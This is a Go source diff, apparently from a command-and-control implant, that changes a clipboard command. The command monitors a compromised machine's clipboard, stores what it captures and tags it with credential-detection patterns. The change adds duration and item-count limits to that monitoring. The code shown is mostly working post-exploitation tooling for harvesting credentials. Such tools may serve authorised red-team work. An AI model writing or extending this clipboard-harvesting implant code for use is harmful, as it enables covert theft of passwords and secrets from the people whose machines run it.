@@ -25,6 +25,8 @@ type ClipboardParams struct {
 	Action   string `json:"action"`
 	Data     string `json:"data"`
 	Interval int    `json:"interval"`
+	Duration int    `json:"duration"` // Max duration in seconds (0 = unlimited, default 300)
+	MaxItems int    `json:"max_items"` // Max entries to capture (0 = unlimited, default 100)
 }
 
 func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
@@ -42,7 +44,7 @@ func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 		return writeClipboard(params.Data)
 	case "monitor":
-		return clipMonitorStart(params.Interval)
+		return clipMonitorStart(params.Interval, params.Duration, params.MaxItems)
 	case "stop":
 		return clipMonitorStop()
 	case "dump":
@@ -67,6 +69,8 @@ type clipMonitorState struct {
 	startTime time.Time
 	lastText  string
 	entries   []clipEntry
+	maxItems  int
+	duration  int
 }
 
 var cm = &clipMonitorState{}
@@ -90,7 +94,7 @@ var credPatterns = []struct {
 	{"IP Address", regexp.MustCompile(`\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`)},
 }
 
-func clipMonitorStart(intervalSec int) structs.CommandResult {
+func clipMonitorStart(intervalSec, durationSec, maxItems int) structs.CommandResult {
 	cm.mu.Lock()
 	if cm.running {
 		cm.mu.Unlock()
@@ -100,19 +104,27 @@ func clipMonitorStart(intervalSec int) structs.CommandResult {
 	if intervalSec <= 0 {
 		intervalSec = 3
 	}
+	if durationSec <= 0 {
+		durationSec = 300 // Default 5 minutes
+	}
+	if maxItems <= 0 {
+		maxItems = 100
+	}
 
 	cm.running = true
 	cm.startTime = time.Now()
 	cm.entries = nil
 	cm.lastText = ""
 	cm.stopCh = make(chan struct{})
+	cm.maxItems = maxItems
+	cm.duration = durationSec
 	cm.mu.Unlock()
 
 	clipReadIntoMonitor()
 
 	go clipMonitorLoop(intervalSec)
 
-	return successf("Clipboard monitor started (polling every %ds). Use 'dump' to view captures, 'stop' to stop.", intervalSec)
+	return successf("Clipboard monitor started (polling every %ds, max %ds, max %d entries). Use 'dump' to view, 'stop' to stop.", intervalSec, durationSec, maxItems)
 }
 
 func clipMonitorStop() structs.CommandResult {
@@ -160,6 +172,17 @@ func clipMonitorLoop(intervalSec int) {
 		case <-cm.stopCh:
 			return
 		case <-ticker.C:
+			// Check duration limit
+			cm.mu.Lock()
+			elapsed := time.Since(cm.startTime)
+			maxDur := cm.duration
+			cm.mu.Unlock()
+			if maxDur > 0 && elapsed >= time.Duration(maxDur)*time.Second {
+				cm.mu.Lock()
+				cm.running = false
+				cm.mu.Unlock()
+				return
+			}
 			clipReadIntoMonitor()
 		}
 	}
@@ -178,6 +201,11 @@ func clipReadIntoMonitor() {
 		return
 	}
 	cm.lastText = text
+
+	// Check max entries limit
+	if cm.maxItems > 0 && len(cm.entries) >= cm.maxItems {
+		return
+	}
 
 	tags := detectCredPatterns(text)
 	cm.entries = append(cm.entries, clipEntry{
